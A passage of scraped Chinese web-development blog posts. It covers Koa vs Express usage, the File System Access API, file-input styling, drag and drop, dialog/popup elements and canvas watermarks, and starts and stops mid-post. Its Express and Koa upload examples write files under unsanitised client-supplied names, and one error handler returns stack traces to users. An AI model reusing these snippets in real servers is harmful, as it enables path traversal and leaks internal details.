ctx.request.path 的别名。 const app = require('express')(); app.get('/', (req, res) =&gt; { res.send('Hello World'); }).get('/*', (req, res) =&gt; { res.send('&lt;a href=&quot;/&quot;&gt;Index Page&lt;/a&gt;'); }).listen(8080, 'localhost'); const app2 = new(require('koa')); app2.use(ctx =&gt; { ctx.body = ctx.path === '/' ? 'Hello World' : '&lt;a href=&quot;/&quot;&gt;Index Page&lt;/a&gt;'; }).listen(3000, 'localhost'); 路由。对于复杂的 HTTP 请求，简单的地址切换就无法胜任了，Express 自带了路由方法和 express.Router() 完整的路由中间件系统。Koa 需要使用 koa-route 或 koa-router（功能更丰富）路由模块。 const express = require('express'); const app = express(); app.route('/').all((req, res) =&gt; { res.send('Hello World'); }); app.route('/user/:name').get((req, res) =&gt; { res.send(`Hello ${req.params.name.fontcolor('magenta')}!`); }).delete((req, res) =&gt; { res.send(`Delete ${req.params.name}!`); }); app.listen(8080, 'localhost'); const app2 = new(require('koa')); const route = require('koa-route'); const main = route.all('/', ctx =&gt; { ctx.body = 'Hello World'; }); const getUser = route.get('/user/:name', function(ctx, name) { ctx.type = 'html'; ctx.body = `Hello ${name.fontcolor('magenta')}!`; }) const deleteUser = route.delete('/user/:name', function(ctx, name) { ctx.type = 'html'; ctx.body = `Delete ${name}!`; }); const all = route.get('/*', ctx =&gt; { ctx.body = '&lt;a href=&quot;/&quot;&gt;Index Page&lt;/a&gt;'; }); app2.use(main).use(getUser).use(deleteUser).use(all); app2.listen(3000, 'localhost'); 静态资源。如果网站提供静态资源（图片、字体、样式表、脚本等），为它们一个个写路由就很麻烦，也没必要。Express 自带了 static 方法，而 Koa 需要使用 koa-static 模块。 const express = require('express'); const app = express(); app.use(express.static('.')).listen(8080, 'localhost', function() { console.log(this.address(), app.get('env')); }); const app2 = new(require('koa')); app2.use(require('koa-static')('.')).listen(3000, 'localhost', function() { console.log(this.address(), app2.env); }); 重定向。有些场合，服务器需要重定向（redirect）访问请求。比如，用户登陆以后，将他重定向到登陆前的页面。Express 通过 res.redirect()，而 Koa 通过 ctx.response.redirect() 方法，可以发出一个 302 跳转，重定向到另一个路由。 const app = require('express')(); app.get('/', (req, res) =&gt; { res.send('&lt;h1&gt;Hello&lt;/h1&gt;'); }).get('/redirect', (req, res) =&gt; { res.redirect('/'); }).listen(8080, 'localhost'); const app2 = new(require('koa')); const route = require('koa-route'); app2.use(route.get('/', ctx =&gt; { ctx.body = '&lt;h1&gt;Hello&lt;/h1&gt;'; })).use(route.get('/redirect', ctx =&gt; { ctx.redirect('/'); })).listen(3000, 'localhost'); 中间件的合成。Express 通过调用 app.use() 可以传入中间件的数组，而 Koa 通过 koa-compose 模块可以将多个中间件合成为一个。 const app = require('express')(); const logger = (req, res, next) =&gt; { console.log(`${Date.now()} ${req.method} ${req.url}`); next(); } const main = (req, res) =&gt; { res.send('Hello World'); }; app.use([logger, main]).listen(8080, 'localhost'); const app2 = new(require('koa')); const logger2 = (ctx, next) =&gt; { console.log(`${Date.now()} ${ctx.method} ${ctx.url}`); next(); } const main2 = ctx =&gt; { ctx.body = 'Hello World'; }; const middlewares = require('koa-compose')([logger2, main2]); app2.use(middlewares).listen(3000, 'localhost'); 表单处理。Web 应用离不开处理表单。本质上，表单就是 POST 方法发送到服务器的键值对。Express 自带了表单解析功能，而 Koa 通过 koa-body 模块可以从 POST 请求的数据体里面提取键值对。 const express = require('express'); const app = express(); app.use(express.json()); // for parsing application/json app.use(express.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded app.all('*', function(req, res) { const { query, body } = req; res.send({ query, body }); }).listen(8080, 'localhost'); const app2 = new(require('koa')); const main = function(ctx) { const query = ctx.request.query; // get const body = ctx.request.body; // post if (!query.name &amp;&amp; !body.name) ctx.throw(400, 'name required'); ctx.body = { query, body }; }; app2.use(require('koa-body')()); app2.use(main).listen(3000, 'localhost'); 文件上传。Express 可以通过 multer 中间件，来处理 enctype=&quot;multipart/form-data&quot; 的表单数据，而 Koa 通过 koa-body 模块还可以用来处理文件上传。 const express = require('express'); const app = express(); const multer = require('multer'); const fs = require('fs'); app.use(express.static('./')); app.use(express.json()); // for parsing application/json app.use(express.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded app.use(multer({ dest: 'upload/' }).array('image')); app.get('/process_get', function(req, res) { res.json(req.query); }).post('/process_post', function(req, res) { res.json(req.body); }).post('/file_upload', function(req, res) { req.files.forEach(file =&gt; { const des_file = &quot;upload/&quot; + file.originalname; console.log(des_file); fs.readFile(file.path, function(err, data) { if (err) console.log(err); else fs.writeFile(des_file, data, function(err) { if (err) console.log(err); }); }); }); res.json(req.files); }); app.listen(8080, 'localhost'); const fs = require('fs'); const app2 = new(require('koa')); const main = async function(ctx) { const tmpdir = require('os').tmpdir(); const filePaths = []; console.log(ctx.request.files, ctx.request.body.files); const files = ctx.request.files || {}; for (let key in files) { const file = files[key]; if (!fs.existsSync('upload')) fs.mkdirSync('upload'); console.log(file.originalFilename); const filePath = require('path').join('upload', file.originalFilename); const reader = fs.createReadStream(file.filepath); const writer = fs.createWriteStream(filePath); reader.pipe(writer); filePaths.push(filePath); } ctx.body = filePaths; }; app2.use(require('koa-body')({ multipart: true, encoding: 'utf-8' })); app2.use(require('koa-static')('.')); app2.use(main).listen(3000, 'localhost'); 错误处理。如果代码运行过程中发生错误，我们需要把错误信息返回给用户。HTTP 协定约定这时要返回 500 状态码。 Express 随附一个内置的错误处理程序，负责处理应用程序中可能遇到的任何错误。这个缺省的错误处理中间件函数需要添加在中间件函数集的末尾才能捕获错误。错误处理中间件的定义方式与其他中间件函数基本相同，差别在于错误处理函数有四个自变量而不是三个：(err, req, res, next)。 app.use((err, req, res, next) =&gt; { console.error(err.stack); res.status(500).send(err.stack); }); Koa 提供了 ctx.throw() 方法，用来抛出错误，ctx.throw(500) 就是抛出 500 错误。如果将 ctx.response.status 设置成 404，就相当于 ctx.throw(404)，返回 404 错误。 const main = ctx =&gt; { ctx.response.status = 404; ctx.response.body = 'Page Not Found'; }; 为每个中间件都写 try...catch 太麻烦，我们可以让最外层的中间件，负责所有中间件的错误处理。 const handler = async (ctx, next) =&gt; { try { await next(); } catch (err) { ctx.status = err.statusCode || err.status || 500; ctx.body = { message: err.message }; } }; const main = ctx =&gt; { ctx.throw(500); }; app.use(handler); app.use(main); 运行过程中一旦出错，Koa 会触发一个 error 事件。监听这个事件，也可以处理错误。 app.on('error', (err, ctx) =&gt; console.error('server error', err); ); 需要注意的是，如果错误被 try...catch 捕获，就不会触发 error 事件。这时，必须调用 ctx.app.emit()，手动释放 error 事件，才能让监听函数生效。 const handler = async (ctx, next) =&gt; { try { await next(); } catch (err) { ctx.status = err.statusCode || err.status || 500; ctx.type = 'html'; ctx.body = '&lt;p&gt;Something wrong, please contact administrator.&lt;/p&gt;'; ctx.app.emit('error', err, ctx); } }; ","link":"https://zkrisj.github.io/post/koa2-he-express-de-shi-yong-dui-bi/"},{"title":"Web 应用程序的文件系统写入能力","content":"介绍 NodeJS 之前，JS 操作文件只能通过 HTML &lt;input type=&quot;file&quot;&gt; 元素或 XMLHttpRequest（或之后的 fetch），来对本地文件进行一些浏览和上传操作。NodeJS 给予了 JS 操作系统底层 API 的能力，但这只能局限在 NodeJS 项目中。 File System Access API 允许直接读取、写入或保存对用户设备上的文件和文件夹的更改。此 API 使开发人员能够构建功能强大的 Web 应用程序，例如 IDE、文本编辑器、图片编辑器和视频编辑器等等。 从 Chrome 86 开始支持 File System Access API，目前只有基于 Chromium 系列的浏览器全面支持，Safari 部分支持（支持读取，不支持写入和保存），而 Firefox 未支持。 下面我们从制作一个网页文本编辑器，来演示文件系统访问 API。 读取文件 大多数与文件和目录的交互都是通过句柄（FileSystemHandle 的子类）完成的。获取句柄的方法通常是 window.showOpenFilePicker 和 window.showDirectoryPicker，调用必须在安全上下文中完成，并且必须从用户手势（事件触发）中调用。 let fileHandle; butOpenFile.addEventListener('click', async () =&gt; { [fileHandle] = await window.showOpenFilePicker(); }); 保留对文件句柄的引用很有帮助，以便以后可以使用。例如，需要它来保存对文件的更改，或执行任何其他文件操作。 获取了文件的句柄，您可以获取文件的属性，或访问文件本身。调用 handle.getFile() 将返回一个 File 对象，然后我们可以通过 slice(), stream(), text(), 或 arrayBuffer() 等方法对其处理。 const file = await fileHandle.getFile(); const contents = await file.text(); 注意：FileSystemFileHandle.getFile() 返回的 File 对象只有在磁盘上的文件未更改时才可读。如果磁盘上的文件被修改，File 对象将变得不可读，您将需要再次调用 getFile() 以获取新的 File 对象来读取更改后的数据。 下面当点击按钮时，浏览器会显示一个文件选择器。一旦他们选择了一个文件，应用程序就会读取内容并将它们放入一个 &lt;textarea&gt; 内显示。 let fileHandle; butOpenFile.addEventListener('click', async () =&gt; { [fileHandle] = await window.showOpenFilePicker(); const file = await fileHandle.getFile(); const contents = await file.text(); textArea.value = contents; }); 写入文件 将数据写入磁盘需要使用一个 FileSystemWritableFileStream 对象，通过文件句柄对象调用 fileHandle.createWritable() 来创建该可写流。 FileSystemWritableFileStream.write(data) 在当前文件光标偏移处将内容写入调用该方法的文件中。 参数 data 可以为以下类型：ArrayBuffer、TypedArray、DataView、Blob、String 类型或包含以下属性的对象： type 为以下之一的字符串：&quot;write&quot;、&quot;seek&quot; 或 &quot;truncate&quot;。 data 要写入的文件数据，可以为以下类型：ArrayBuffer、TypedArray、DataView、Blob。如果 type 设置为 &quot;write&quot;，则此属性是必需的。 position 如果 type 设置为 &quot;seek&quot;，表示当前文件光标应移动到的字节位置。如果 type 设置为 &quot;write&quot;，表示开始写入的位置。 size 一个无符号 long 类型，表示流应包含的字节数。如果 type 设置为 &quot;truncate&quot;，则此属性是必需的。 该方法返回一个包含 undefined 的 Promise。 // 只传入数据 writableStream.write(data); // 从确定的位置将数据写入流 writableStream.write({ type: &quot;write&quot;, position, data }); // 将当前文件光标偏移量更新到指定位置 writableStream.write({ type: &quot;seek&quot;, position }); // 将文件大小调整为 size 字节长 writableStream.write({ type: &quot;truncate&quot;, size }); 要注意的是，在流关闭之后，才会将更改写入磁盘上的实际文件。 async function writeFile(fileHandle, contents) { const writable = await fileHandle.createWritable(); await writable.write(contents); await writable.close(); } 另外，还可以将流直接通过管道传递给写入流，下面 pipeTo() 方法调用后，默认关闭目标管道，无需再关闭写入流。 async function writeURLToFile(fileHandle, url) { const writable = await fileHandle.createWritable(); const response = await fetch(url); await response.body.pipeTo(writable); } showSaveFilePicker(options) 显示一个允许用户保存文件的文件选择器。返回处理后的包含 FileSystemFileHandle 对象的 Promise。 参数 options 可选，支持以下属性： id 通过指定一个 id，浏览器可以记住上次使用的目录。 startIn 起始目录，例如 &quot;desktop&quot;（桌面）, &quot;documents&quot;（文档）, &quot;downloads&quot;（下载）, &quot;music&quot;（音乐）, &quot;pictures&quot;（图片）, &quot;videos&quot;（视频）。还可以将现有文件或目录句柄传递到此参数。 suggestedName 文件名。 excludeAcceptAllOption 默认为 false，是否排除 types 中的 accept 文件类型列表。 types 可选择的文件类型数组，每个数组项也是个对象，支持下面两个参数： description 文件或者文件夹的描述，字符串，可选。 accept 一个对象，键为 MIME 类型，值为保存的扩展名数组。 如果需要保存为一个 .txt 扩展名的文本文件： async function getNewFileHandle() { const opts = { types: [{ description: 'Text file', accept: {'text/plain': ['.txt']}, }], }; return await window.showSaveFilePicker(opts); } 一般在文本编辑器中，有两种保存文件的方法：保存和另存为。保存只是使用先前检索到的文件句柄将更改写回原始文件。但是另存为会创建一个新文件，因此需要一个新的文件句柄。 注意事项 需要 https 协议，如果是本地 localhost 不受此限制。 不能在 iframe 内使用，会报 SecurityError。所以很遗憾，马上掘金上面不能体验了。 Uncaught (in promise) {&quot;name&quot;:&quot;SecurityError&quot;,&quot;message&quot;:&quot;Failed to execute 'showSaveFilePicker' on 'Window': Cross origin sub frames aren't allowed to show a file picker.&quot;,&quot;stack&quot;:&quot;Error: Failed to execute 'showSaveFilePicker' on 'Window': Cross origin sub frames aren't allowed to show a file picker.\\n at HTMLButtonElement. (:17:37)&quot;} 使用 下面定义两个按钮，分别写入文本和图片并保存。文本和图片 URL 可以根据需求自定义。 &lt;body&gt; &lt;button id=&quot;saveText&quot;&gt;保存文本文件&lt;/button&gt; &lt;button id=&quot;saveImg&quot;&gt;保存图片&lt;/button&gt; &lt;/body&gt; &lt;script&gt; async function writeFile(fileHandle, contents) { const writable = await fileHandle.createWritable(); await writable.write(contents); await writable.close(); } async function writeURLToFile(fileHandle, url) { const writable = await fileHandle.createWritable(); const response = await fetch(url); await response.body.pipeTo(writable); } saveText.addEventListener('click', async function() { const opts = { startIn: 'downloads', types: [{ description: 'Text file', accept: { 'text/plain': ['.txt'] }, }], suggestedName: 'Untitled', id: 0, }; await writeFile(await window.showSaveFilePicker(opts), '你好！'); }); saveImg.addEventListener('click', async function() { const opts = { startIn: 'downloads', types: [{ description: 'Image file', accept: { 'image/jpg': ['.jpg'] }, }], suggestedName: 'Untitled', id: 0, }; await writeURLToFile(await window.showSaveFilePicker(opts), 'https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/211a1a5980f94f0095a46017e9bc9755~tplv-k3u1fbpfcp-watermark.image?'); }); &lt;/script&gt; &lt;style&gt; button { border: 0; border-radius: .5em; padding: 1em; background: coral; color: white; } &lt;/style&gt; ","link":"https://zkrisj.github.io/post/web-ying-yong-cheng-xu-de-wen-jian-xi-tong-xie-ru-neng-li/"},{"title":"不使用 input file 元素，JS 如何操作文件","content":"介绍 NodeJS 之前，JS 操作文件只能通过 HTML &lt;input type=&quot;file&quot;&gt; 元素或 XMLHttpRequest（或之后的 fetch），来对本地文件进行一些浏览和上传操作。NodeJS 给予了 JS 操作系统底层 API 的能力，但这只能局限在 NodeJS 项目中。 从 Chrome 86 开始，在浏览器中 File System Access API 提供了 JS 操作文件的能力，目前只有基于 Chromium 系列的浏览器全面支持，Safari 部分支持，而 Firefox 未支持。该 API 允许读取文件、写入或保存文件以及访问目录结构，包括本地文件系统和网络文件系统。 接口 大多数与文件和目录的交互都是通过句柄（FileSystemHandle 的子类）完成的。FileSystemHandle 有两个子类：FileSystemFileHandle 和 FileSystemDirectoryHandle，分别用于文件和目录。 获取句柄的方法通常是 window.showOpenFilePicker 和 window.showDirectoryPicker（另外，DataTransferItem.getAsFileSystemHandle() 也可以获取文件系统访问句柄），并且这些方法都是异步的，返回值为 Promise。这些方法被调用后，文件选择器就会弹出，用户可以选择一个或多个文件或目录来获取句柄。 showOpenFilePicker(options) 用来显示一个文件选择器，用户选择一个或多个文件后返回包含所选择文件的句柄数组的 Promise。 参数 options 可选，支持以下属性： multiple 默认为 false，设置为 true 时，可以选择多个文件。 excludeAcceptAllOption 默认为 false，是否排除 types 中的 accept 文件类型列表。 types 可选择的文件类型数组，每个数组项也是个对象，支持下面两个参数： description 文件或者文件夹的描述，字符串，可选。 accept 一个对象，表示接受的文件类型，对象的键是文件的 MIME 类型，值表示支持的文件后缀的数组。 showDirectoryPicker(options) 用来显示一个目录选择器，用户选择一个目录后返回包含所选择的目录的句柄的 Promise。 参数 options 可选，支持下以下属性： id 通过指定 id，可以用来区分不同的目录，相同 id 将打开同一目录。 mode 读写模式，默认为 read，可以设置为 readwrite。 startIn 起始目录，例如 &quot;desktop&quot;（桌面）, &quot;documents&quot;（文档）, &quot;downloads&quot;（下载）, &quot;music&quot;（音乐）, &quot;pictures&quot;（图片）, &quot;videos&quot;（视频）。 使用 以前我们想要更改 input type=file 文件选择框的样式，要么隐藏文件选择输入框，然后使用 &lt;label&gt; 元素模拟文件选择框，或者使用 CSS 伪元素 ::file-selector-button。现在有了 File System Access API，我们可以直接在页面中任意元素上来触发文件操作。 &lt;body&gt; &lt;button id=&quot;selectFile&quot;&gt;选择文件&lt;/button&gt; &lt;button id=&quot;selectDirectory&quot;&gt;选择目录&lt;/button&gt; &lt;/body&gt; &lt;script&gt; selectFile.addEventListener('click', async function() { const arrFileHandle = await window.showOpenFilePicker({ types: [{ accept: { 'image/*': ['.png', '.gif', '.jpeg', '.jpg', '.webp'] } }], multiple: true }); for (const fileHandle of arrFileHandle) { const fileData = await fileHandle.getFile(); document.body.insertAdjacentHTML('beforeend', `&lt;img src=&quot;${URL.createObjectURL(fileData)}&quot;&gt;`); } }); selectDirectory.addEventListener('click', async function() { const dirHandle = await window.showDirectoryPicker({ startIn: 'pictures' }); const values = dirHandle.values(); const files = []; let next; async function getFile() { next = await values.next(); const { value } = next; if (value) { if (value.kind === 'file') files.push(await value.getFile()); else console.log('是目录', value.name); } } await getFile(); while (!next.done) await getFile(); files.forEach(file =&gt; { /^image\\/.+/.test(file.type) &amp;&amp; document.body.insertAdjacentHTML('beforeend', `&lt;img src=&quot;${URL.createObjectURL(file)}&quot;&gt;`); }); }); &lt;/script&gt; &lt;style&gt; button { border: 0; border-radius: .5em; padding: 1em; background: coral; color: white; } img { max-width: 100%; } &lt;/style&gt; 注意事项 需要 https 协议，如果是本地 localhost 不受此限制。 不能在 iframe 内使用，会报 SecurityError。所以很遗憾，马上掘金上面不能体验了。 Uncaught (in promise) {&quot;name&quot;:&quot;SecurityError&quot;,&quot;message&quot;:&quot;Failed to execute 'showOpenFilePicker' on 'Window': Cross origin sub frames aren't allowed to show a file picker.&quot;,&quot;stack&quot;:&quot;Error: Failed to execute 'showOpenFilePicker' on 'Window': Cross origin sub frames aren't allowed to show a file picker.\\n at HTMLButtonElement. (:3:38)&quot;} 关于 File System Access API 的写入和保存文件的能力，后续补充。 ","link":"https://zkrisj.github.io/post/bu-shi-yong-input-file-yuan-su-js-ru-he-cao-zuo-wen-jian/"},{"title":"如何更简单地更改 input type=file 文件选择框的样式","content":"介绍 HTML 原生的 &lt;input type=&quot;file&quot;&gt; 文件选择框元素样式在各个浏览器上面由用户代理默认设置样式，如果在页面上应用了其他颜色或主题时，我们通常也相应的更改这些输入框或按钮的颜色或背景，否则会出现颜色与背景或主题不融入的样式不一致问题。 通常的做法是隐藏文件选择输入框，然后使用 &lt;label&gt; 元素模拟文件选择框，点击 &lt;label&gt; 元素就会自动触发文件选择输入框的点击选择行为，再通过监听文件选择框的 change 事件还可以将文件信息显示在页面上。HTML 结构示意如下： &lt;body&gt; &lt;label for=&quot;fileInput&quot;&gt;Choose a file to upload&lt;/label&gt; &lt;input id=&quot;fileInput&quot; onchange=&quot;updateFileList(this)&quot; type=&quot;file&quot; multiple&gt; &lt;ul id=&quot;fileList&quot;&gt;&lt;/ul&gt; &lt;/body&gt; &lt;script&gt; function updateFileList(fileInput) { while (fileList.firstChild) fileList.removeChild(fileList.firstChild); var curFiles = fileInput.files; if (!(curFiles.length === 0)) { [].forEach.call(curFiles, function(file) { var listItem = document.createElement('li'); listItem.textContent = 'File name: ' + file.name + '; file size ' + returnFileSize(file.size) + '.'; fileList.appendChild(listItem); }); } } function returnFileSize(number) { if (number &lt; 1024) { return number + 'bytes'; } else if (number &gt;= 1024 &amp;&amp; number &lt; 1048576) { return (number / 1024).toFixed(1) + 'KB'; } else if (number &gt;= 1048576) { return (number / 1048576).toFixed(1) + 'MB'; } } &lt;/script&gt; &lt;style&gt; button, label, input { display: inline-block; padding: .5em 1em; } input[type=file] { display: none; } label[for=fileInput] { background: linear-gradient(to bottom, #eee, #ccc); } &lt;/style&gt; 这种方式虽然比较繁琐，但是可以定制更多内容，并且兼容 IE。 CSS 伪元素 ::file-selector-button Chrome 89 开始支持，目前除了 IE，其他各浏览器都已支持，匹配 &lt;input type=&quot;file&quot;&gt; 元素上的按钮，兼容写法为 ::-webkit-file-upload-button。通过伪元素 ::file-selector-button 定制文件选择框的样式更加简单了： &lt;body&gt; &lt;input type=&quot;file&quot; multiple&gt; &lt;/body&gt; &lt;style&gt; /* 后面的提示文字颜色 */ [type=file] { color: red; /* font-size: 0; */ } /* 主按钮的样式自定义 */ ::file-selector-button { height: 3rem; color: #fff; border-radius: .25rem; border: 1px solid #2a80eb; padding: .75rem 1rem; background-color: #2a80eb; cursor: pointer; } ::-ms-browse { height: 3rem; color: #fff; border-radius: .25rem; border: 1px solid #2a80eb; padding: .75rem 1rem; background-color: #2a80eb; cursor: pointer; } &lt;/style&gt; IE 浏览器（IE10+）也支持对文件选择框样式自定义，但是使用的是私有的 ::-ms-browse 伪元素。另外，如果希望隐藏按钮后面的“未选择任何文件”的文字，只需对当前 &lt;input&gt; 元素设置样式 font-size: 0 即可。 参考资料 CSS ::file-selector-button 伪元素简介 ","link":"https://zkrisj.github.io/post/ru-he-geng-jian-dan-di-geng-gai-input-typefile-wen-jian-xuan-ze-kuang-de-yang-shi/"},{"title":"拖拽删除元素、拖拽排序、拖拽预览图片和拖拽移动元素","content":"介绍 HTML5 提供了专门的拖拽与拖放的 API，目前各浏览器都已支持，包括 IE。HTML 拖放（Drag and Drop）接口使应用程序能够在浏览器中使用拖放功能。例如，用户可使用鼠标选择可拖拽（draggable）元素，将元素拖拽到可放置（droppable）元素，并释放鼠标按钮以放置这些元素。 事件类型 事件 On 型事件处理程序 触发时刻 drag ondrag 当拖拽元素或选中的文本时触发。 dragend ondragend 当拖拽操作结束时触发 (比如松开鼠标按键或敲 Esc 键)。 dragenter ondragenter 当拖拽元素或选中的文本到一个可释放目标时触发。 dragleave ondragleave 当拖拽元素或选中的文本离开一个可释放目标时触发。 dragover ondragover 当元素或选中的文本被拖到一个可释放目标上时触发（每 100 毫秒触发一次）。 dragstart ondragstart 当用户开始拖拽一个元素或选中的文本时触发。 drop ondrop 当元素或选中的文本在可释放目标上被释放时触发。 注意：当从操作系统向浏览器中拖拽文件时，不会触发 dragstart 和dragend 事件。 接口 给应用程序添加 HTML 拖放功能，主要使用 DragEvent 和 DataTransfer 这两个接口。 DragEvent 继承自 MouseEvent，有一个 dataTransfer 属性（DataTransfer 对象），在拖放交互期间传输的数据主要通过这个属性完成。 DataTransfer 保存着拖拽操作中的数据，例如拖拽事件的类型（如拷贝 copy 或者移动 move），拖拽的数据（一个或者多个项）和每个拖拽项的类型（MIME 类型）。 items 属性 包含包含所有拖动数据 DataTransferItem 对象的列表（DataTransferItemList 对象，包括 add、remove 和 clear 方法）。一个 DataTransferItem 代表一个拖拽项目，每个项目都有一个 kind 属性（值为 string 或 file）和一个表示数据项目 MIME 类型的 type 属性。DataTransferItem 对象也有获取拖拽项目数据的方法：DataTransferItem.getAsFile() 和 DataTransferItem.getAsString()。 DataTransfer 对象使用同步的 getData() 方法去得到拖拽项的数据，而 DataTransferItem 对象使用异步的 getAsString() 方法得到拖拽项的数据。 files 属性 包含数据传输中可用的所有本地文件的列表（FileList 对象）。如果拖动操作不涉及拖动文件，则此属性为空列表。 HTML draggable 属性 这个属性是枚举类型，而不是布尔类型。这意味着必须显式指定值为 true 或者 false，而不能简写。 拖拽选中文本、拖拽图像和拖拽链接时，会使用默认拖拽行为。 拖拽图像或链接时，图像或链接的 URL 被设定为拖拽数据。 对于其他元素，只有当它们作为被选中的一部分时，才会触发默认拖拽行为。 除了图像、链接和选择的文本默认的可拖拽行为之外，其他元素在默认情况下是不可拖拽的。如果要使其他的 HTML 元素可拖拽： 将想要拖拽的元素的 draggable 属性设置成 draggable=&quot;true&quot;。 为 dragstart 事件添加监听。 在定义的监听中设置拖拽数据。 &lt;p draggable=&quot;true&quot; ondragstart=&quot;event.dataTransfer.setData('text/plain', 'This text may be dragged')&quot;&gt; This text &lt;strong&gt;may&lt;/strong&gt; be dragged. &lt;/p&gt; 拖拽删除元素 拖拽右侧的列表项目到左侧时，在列表项目元素中通过 ondragstart 事件获取到当前的拖拽元素，然后在左侧容器元素中通过 ondrop 事件根据当前的拖拽元素，可以删除该列表项目。 拖拽排序 拖拽列表项目时，在列表项目元素中通过 dragstart 事件获取到当前的拖拽元素和事件的 offsetY，然后在列表容器元素中通过 dragover 事件，根据当前拖拽移动在上面的列表元素事件的 offsetY，对比当前拖拽中的元素的 offsetY，对当前拖拽移动在上面的列表元素进行 before 或 after 操作。 拖拽预览图片 从本地拖拽文件到页面中时，通过获取 DragEvent 的 DataTransfer 对象的 files 属性，然后由 URL.createObjectURL 创建对象 URL，可以预览该图片。 拖拽效果 HTML Drag and Drop API 方便了我们对拖拽数据的处理，如果需要实现 HTML 元素的拖拽移动，更加方便地是使用 mouse 事件。 设置要拖拽的元素绝对定位或是相对定位（position:absolute/relative）。 监听 onmousedown、onmouseup 和 onmousemove 事件，获取 clientX 和 clientY。 将获取到的 clientX 和 clientY 赋值给元素的 CSS 属性 left 和 top。 参考资料 JavaScript实现最简单的拖拽效果 ","link":"https://zkrisj.github.io/post/html-drag-and-drop-api-he-shi-xian-ye-mian-yuan-su-tuo-zhuai-xiao-guo/"},{"title":"使用 <dialog> 元素和 Popup API 自定义对话框","content":"介绍 alert、confirm、prompt 对话框： 不能自定义样式和复杂的内容。 会阻塞页面渲染和脚本的执行，直到这个对话框被点击。 所以在开发的过程中，我们一般根据自己自己的需求来自定义或者使用第三方的 UI 库。随着浏览器 API 的不断更新，我们现在可以很容易地使用浏览器的原生能力来实现自己想要的需求。比如 HTML5 中的 &lt;dialog&gt; 元素和最新的 Popup API。 dialog HTML 5.2 推出了一个新的原生模态对话框元素 &lt;dialog&gt;，目前除了 IE，其他浏览器都已支持。&lt;dialog&gt; 元素默认定义了基本的用户代理提供的样式，如自动边距、粗边框样式等，并且可以使用 CSS 自定义。它还提供了一系列的专有属性、方法和事件： open 属性用来标识和切换对话框的显示。 returnValue 属性用来获取对话框的值。 close() 方法用来关闭对话框。可选传入类字符串参数，用来更新对话框的 returnValue。 show() 方法用来不带遮罩显示这个对话框，即：打开这个对话框之后依然可以和其他内容进行交互。 showModal() 方法用来遮罩模式显示这个对话框，并且将会至于所有其他页面元素和对话框的顶层（屏蔽其他页面元素和对话框的交互）。 cancel 事件当用户按下 Esc 键或单击作为浏览器 UI 一部分的“关闭对话框”按钮时触发。 close 事件当 &lt;dialog&gt; 元素被关闭时触发。 Popup API 由 Open UI 小组 发布的 Pop-Up API 提案，从 Chrome 106 开始支持。 目前除了 Chrome 其他浏览器都不支持，所以在兼容性方面比 HTML5 &lt;dialog&gt; 元素差太多。 它提供了比 &lt;dialog&gt; 更简单的方式来定义弹框：通过在 HTML 元素上定义 popup 属性即可实现将任意元素（除了 template 模板元素）包装为一个弹框，并且将默认地具有用户代理提供的样式。 [popup] { position: fixed; width: fit-content; height: fit-content; color: canvastext; background-color: canvas; inset: 0px; margin: auto; border-width: initial; border-style: solid; border-color: initial; border-image: initial; padding: 0.25em; overflow: auto; } 例如，通过以下方式，无需任何 CSS 和 JS，就可以创建一个简单的弹框和一个按钮用来切换显示和关闭： &lt;div id=&quot;my-first-pop-up&quot; popup&gt;Pop-up content!&lt;/div&gt; &lt;button popuptoggletarget=&quot;my-first-pop-up&quot;&gt;Toggle Pop-up&lt;/button&gt; 对比 &lt;dialog&gt; 元素 与 &lt;dialog&gt; 元素的最大区别是它没有遮罩模式。 Popup 弹框支持 Esc 键关闭弹框，而非遮罩模式 &lt;dialog&gt; 元素不支持 Esc 键关闭。 form 表单元素支持通过 method=&quot;dialog&quot; 关联父 &lt;dialog&gt; 元素。 HTML 属性 defaultopen 在页面加载时自动打开弹框。 popup 将元素变成弹框元素。 popuptoggletarget 创建一个触发器元素，用于在显示和隐藏状态之间切换关联的弹框元素。 popupshowtarget 创建一个显示关联的弹框元素的触发器元素。 popuphidetarget 创建一个触发器元素，用于关闭关联的弹框元素。 CSS 属性 ::backdrop 匹配弹框元素后面的其余页面内容，例如，可以设置将其模糊或变暗效果。 :open 匹配显示的弹框元素。 方法 showPopUp() 显示弹框元素。 hidePopUp() 关闭弹框元素。 事件 show 弹框元素显示时触发。 hide 弹框元素被关闭时触发。 参考资料 The Pop-Up API ","link":"https://zkrisj.github.io/post/shi-yong-lessdialoggreater-yuan-su-he-popup-api-zi-ding-yi-dui-hua-kuang/"},{"title":"Canvas 实现文字水印和图片水印合成","content":"介绍 给图片添加水印可以帮助网站或作者保护自己的版权，或防止内容被别人利用。给图片添加水印分为添加文字水印和添加图片水印，水印一般都做成半透明的，这样不至于影响原图内容的浏览。Canvas 图片水印合成与 Canvas 实现图片压缩 原理基本相同： CanvasRenderingContext2D.drawImage(image, dx, dy, dWidth, dHeight) 方法可以从页面 DOM 元素作为图像源来根据坐标和大小重新绘制该图像。 HTMLCanvasElement.toDataURL() 方法支持导出为 base64 字符串。 文字水印 首先创建一个空的 canvas 元素，并获取其上下文。 const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); 获取页面上需要合成水印的 img 元素，或者根据一个 File 或 Blob 对象，创建一个空的 img 元素，将其 src 设为 File 或 Blob 对象的 URL。 设置 canvas 元素的宽高为 img 元素的宽高，清除画布，绘制图像。 canvas.width = img.width; canvas.height = img.height; ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.drawImage(img, 0, 0, canvas.width, canvas.height); 设置字体、对齐方式、旋转角度。 ctx.font = `bold ${img.height / 10}px arial`; ctx.fillStyle = 'rgba(255, 0, 0, .2)'; ctx.textBaseline = 'bottom'; ctx.transform(1, 0.5, -0.5, 1, 0, -canvas.height / 2); 定义水印文字、水印高度，循环绘制水印。 let txt = '1234567 '; const txtHeight = img.height / 6; txt = Array(Math.ceil(canvas.width / ctx.measureText(txt).width) * 2).join(txt); for (let i = 0; i &lt; Math.ceil(canvas.height / txtHeight) * 2; i++) { ctx.fillText(txt, 0, i * txtHeight); } 在页面渲染合成后的图像，释放创建的 URL 对象。 result.src = canvas.toDataURL(type); URL.revokeObjectURL(img.src); 马上掘金（由于 canvas 的跨域问题，可能需要点击运行按钮重新运行一下才能看到效果）。 图片水印 首先创建一个空的 canvas 元素，并获取其上下文。 const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); 获取页面上需要合成水印的 img 元素，或者根据一个 File 